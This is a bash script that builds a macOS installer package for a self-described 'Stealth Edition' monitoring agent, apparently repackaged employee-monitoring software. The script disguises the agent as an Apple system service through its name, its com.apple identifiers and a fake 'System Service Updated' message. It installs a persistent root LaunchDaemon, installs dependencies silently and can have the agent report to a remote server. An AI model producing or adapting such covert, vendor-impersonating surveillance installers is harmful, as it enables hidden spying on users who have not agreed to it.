#!/bin/bash
# ================================================
# AppleSystemServices Agent .pkg Installer Builder v3.5 (Stealth Edition)
# Run this once to create agent installer.pkg
#
# Usage:
#   ./build_installer.sh                                    # Local-only agent
#   ./build_installer.sh http://192.168.1.100:5000           # Agent reports to local server
#   ./build_installer.sh https://your-app.onrender.com       # Agent reports to cloud server (RECOMMENDED)
# ================================================

set -e

APP_NAME="AppleSystemServices"
PKG_NAME="AppleSystemServices-Installer.pkg"
INSTALL_DIR="/Library/Application Support/AppleSystemServices"
PLIST_DST="/Library/LaunchDaemons/com.apple.system.services.plist"

# Optional: Central server URL from first argument
CENTRAL_SERVER="${1:-}"

echo ""
echo "================================================"
echo "  🔧 Building $APP_NAME Stealth Agent Installer..."
if [ -n "$CENTRAL_SERVER" ]; then
    echo "  📡 Agent will report to: $CENTRAL_SERVER"
fi
echo "================================================"

# -------- Prepare stage directory --------
STAGE_DIR="$(mktemp -d)/stage"
PAYLOAD_DIR="$STAGE_DIR/payload"
SCRIPTS_DIR="$STAGE_DIR/scripts"

mkdir -p "$PAYLOAD_DIR$INSTALL_DIR"
mkdir -p "$PAYLOAD_DIR/Library/LaunchDaemons"
mkdir -p "$SCRIPTS_DIR"

# -------- Copy app files into payload --------
cp monitor.py "$PAYLOAD_DIR$INSTALL_DIR/monitor.py"
cp sysupdate.py "$PAYLOAD_DIR$INSTALL_DIR/sysupdate.py"
cp -R templates "$PAYLOAD_DIR$INSTALL_DIR/"

# -------- Build the LaunchDaemon plist --------
if [ -n "$CENTRAL_SERVER" ]; then
    # Agent mode: reports to central server
    cat > "$PAYLOAD_DIR$PLIST_DST" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.services</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/Library/Application Support/AppleSystemServices/sysupdate.py</string>
        <string>--server</string>
        <string>$CENTRAL_SERVER</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/var/log/com.apple.system.services.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/com.apple.system.services.err</string>
    <key>ThrottleInterval</key>
    <integer>10</integer>
</dict>
</plist>
PLIST
else
    # Local-only mode
    cat > "$PAYLOAD_DIR$PLIST_DST" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.services</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/Library/Application Support/AppleSystemServices/sysupdate.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/var/log/com.apple.system.services.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/com.apple.system.services.err</string>
    <key>ThrottleInterval</key>
    <integer>10</integer>
</dict>
</plist>
PLIST
fi

# -------- postinstall script --------
cat > "$SCRIPTS_DIR/postinstall" << 'SCRIPT'
#!/bin/bash
set -e

INSTALL_DIR="/Library/Application Support/AppleSystemServices"
PLIST_PATH="/Library/LaunchDaemons/com.apple.system.services.plist"

# Clean up old legacy service if present
launchctl unload "/Library/LaunchDaemons/com.employeemonitor.dashboard.plist" 2>/dev/null || true
rm -f "/Library/LaunchDaemons/com.employeemonitor.dashboard.plist" 2>/dev/null || true
rm -rf "/Library/Application Support/EmployeeMonitor" 2>/dev/null || true

# Set correct permissions
chmod -R 755 "$INSTALL_DIR"
chmod 644 "$PLIST_PATH"
chown root:wheel "$PLIST_PATH"

# Install Python dependencies silently
/usr/bin/python3 -m pip install flask psutil requests \
    --quiet --break-system-packages 2>/dev/null || \
/usr/bin/python3 -m pip install flask psutil requests \
    --quiet 2>/dev/null || true

# Unload stealth daemon if running
launchctl unload "$PLIST_PATH" 2>/dev/null || true

# Load stealth daemon
launchctl load -w "$PLIST_PATH"

echo "✅ System Service Updated Successfully!"
exit 0
SCRIPT

chmod +x "$SCRIPTS_DIR/postinstall"

# -------- Build .pkg --------
echo "📦 Packaging..."

pkgbuild \
    --root "$PAYLOAD_DIR" \
    --scripts "$SCRIPTS_DIR" \
    --identifier "com.apple.system.services" \
    --version "3.5" \
    --install-location "/" \
    "$PKG_NAME"

echo ""
echo "================================================"
echo "  ✅ Package created: $PKG_NAME"
echo "  Stealth Service: com.apple.system.services"
if [ -n "$CENTRAL_SERVER" ]; then
    echo "  📡 Central Server: $CENTRAL_SERVER"
fi
echo "================================================"
echo ""
